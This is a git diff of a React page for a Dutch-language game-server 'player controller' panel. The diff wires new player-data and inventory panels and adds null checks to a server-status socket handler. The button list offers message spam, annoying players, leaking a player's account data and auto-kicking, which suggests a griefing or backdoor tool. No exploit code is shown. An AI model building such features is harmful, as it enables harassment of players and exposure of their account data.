@@ -18,6 +18,8 @@ import KillPanel from './features/panels/KillPanel';
 import BanPanel from './features/panels/BanPanel';
 import PMSpamPanel from './features/panels/PMSpamPanel';
 import LeakPanel from './features/panels/LeakPanel';
+import SpelerDataPanel from './features/panels/SpelerDataPanel';
+import InventoryPanel from './features/panels/InventoryPanel';
 
 function PlayerControllerPage(){
     const { serverid } = useParams();
@@ -36,9 +38,12 @@ function PlayerControllerPage(){
     }, []);
     useEffect(function checkServerStatus(){
         socket.on(`server:disable-server`, data => {
-            if (data.Address === server.Address){
+            if (data === null || data.Address === null || server === null || server.Address === null){
+                setServer(null);
+            }else if (data.Address === server.Address){
                 if (data.State == false)setServer(null);
             }
+            
         })
     }, [server]);
     function handleFeatureClick(panelName: any) {
@@ -83,8 +88,8 @@ function PlayerControllerPage(){
                     <FeatureButton title='Private Message Spam' description="Spam de speler vol met verschillende willekeurige berichten" onClick={() => handleFeatureClick(<PMSpamPanel player={selectedPlayer} />)} />
                     <FeatureButton title='Leaken' description="Leak de gegevens van de speler zijn account" onClick={() => handleFeatureClick(<LeakPanel player={selectedPlayer} />)} />
                     <FeatureButton title='Irriteren' description="Irriteer de speler met wat toys" onClick={() => handleFeatureClick(<LeakPanel player={selectedPlayer} />)} />
-                    <FeatureButton title='Speler Data' description="Bekijk al de informatie over de speler" onClick={() => handleFeatureClick(<LeakPanel player={selectedPlayer} />)} />
-                    <FeatureButton title='Inventory' description="Bekijk en pas de inventarissen van de speler aan" onClick={() => handleFeatureClick(<LeakPanel player={selectedPlayer} />)} />
+                    <FeatureButton title='Speler Data' description="Bekijk al de informatie over de speler" onClick={() => handleFeatureClick(<SpelerDataPanel player={selectedPlayer} server={server} />)} />
+                    <FeatureButton title='Inventory' description="Bekijk en pas de inventarissen van de speler aan" onClick={() => handleFeatureClick(<InventoryPanel player={selectedPlayer} server={server} />)} />
                     <FeatureButton title='Money' description="Pas het saldo van de speler aan" onClick={() => handleFeatureClick(<LeakPanel player={selectedPlayer} />)} />
                     <FeatureButton title='Experience' description="Geef de speler experience of verwijder ze" onClick={() => handleFeatureClick(<LeakPanel player={selectedPlayer} />)} />
                     <FeatureButton title='Auto Kicker' description="Zorgt ervoor dat de speler niet meer in staat is de server te joinen. Hij zal telkens gekicked worden." onClick={() => handleFeatureClick(<LeakPanel player={selectedPlayer} />)} />
